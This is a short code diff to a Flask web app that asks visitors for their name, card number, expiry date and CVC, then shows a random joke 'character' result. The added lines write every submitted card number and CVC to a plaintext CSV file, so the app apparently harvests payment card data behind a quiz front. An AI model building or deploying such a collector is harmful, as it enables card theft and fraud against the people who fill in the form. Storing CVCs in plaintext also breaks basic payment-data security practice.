@@ -1,5 +1,6 @@
 import random
 from flask import Flask, render_template, request
+import csv
 
 app = Flask(__name__)
 
@@ -21,6 +22,9 @@ def save():
     if '/' not in date:
         return render_template('index.html', message="что-то не так с датой карты")
 
+    with open('data/results.csv', 'a', newline='') as file:
+        writer = csv.writer(file, delimiter=';')
+        writer.writerow([name, number, date, cvc])
 
     return render_template('result.html', role=random.choice(['вупсень', "пупсень"]))
 
